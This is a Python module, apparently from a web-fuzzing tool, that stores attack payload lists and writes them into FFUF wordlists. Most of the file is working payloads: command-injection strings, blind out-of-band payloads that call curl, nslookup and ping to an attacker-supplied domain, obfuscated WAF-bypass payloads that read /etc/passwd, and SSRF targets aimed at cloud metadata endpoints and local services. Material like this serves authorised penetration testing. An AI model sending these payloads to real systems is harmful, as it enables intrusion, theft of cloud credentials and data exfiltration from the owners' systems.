
import os
import tempfile
import logging
from typing import Set

logger = logging.getLogger(__name__)

# Basic payloads for reflection check
BASIC_PAYLOADS = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    ";whoami",
    "|whoami",
    "&&id",
    "||id",
]

# OOB payloads for blind injection
OOB_PAYLOADS = [
    ";curl http://{{OOB_DOMAIN}}/c",
    "|curl http://{{OOB_DOMAIN}}/p",
    "$(curl http://{{OOB_DOMAIN}}/s)",
    "`curl http://{{OOB_DOMAIN}}/b`",
    ";nslookup {{OOB_DOMAIN}}",
    "|nslookup {{OOB_DOMAIN}}",
    "$(nslookup {{OOB_DOMAIN}})",
    "&nslookup {{OOB_DOMAIN}}&",
    ";ping -c 1 {{OOB_DOMAIN}}",
]

# WAF bypass attempts
WAF_BYPASS_PAYLOADS = [
    ";i${IFS}d",
    "|i${IFS}d",
    ";cat${IFS}/etc/passwd",
    "$(echo${IFS}L2V0Yy9wYXNzd2Q=|base64${IFS}-d|xargs${IFS}cat)",
    "%0Aid",
    "%0Awhoami",
    "&lt;!--#exec%20cmd=&quot;id&quot;--&gt;",
]

# SSRF Payloads (Common internal/cloud targets)
SSRF_TARGETS = [
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
]

PAYLOAD_MAP = {
    "basic": BASIC_PAYLOADS,
    "blind_oob": OOB_PAYLOADS,
    "waf_bypass": WAF_BYPASS_PAYLOADS,
    "ssrf": SSRF_TARGETS
}

def generate_wordlist(category: str, oob_domain: str = None, blocked_cmds: Set[str] = None) -> str:
    """
    Generate a temporary wordlist file for FFUF.
    Returns the absolute path to the file.
    """
    payloads = PAYLOAD_MAP.get(category, [])
    if not payloads:
        return ""

    # Filter blocked commands and replace OOB domain
    safe_payloads = []
    for p in payloads:
        # Check against blocked commands (simple check)
        if blocked_cmds:
            p_low = p.lower()
            if any(cmd.lower() in p_low for cmd in blocked_cmds):
                continue
        
        # Replace OOB domain if provided
        if oob_domain:
            p = p.replace("{{OOB_DOMAIN}}", oob_domain)
        
        safe_payloads.append(p)

    if not safe_payloads:
        return ""

    fd, path = tempfile.mkstemp(prefix="shigoku_fuzz_", suffix=".txt", text=True)
    with os.fdopen(fd, 'w') as f:
        f.write("\n".join(safe_payloads))
    
    logger.info("Generated wordlist for category '%s' at %s (%d payloads)", category, path, len(safe_payloads))
    return path
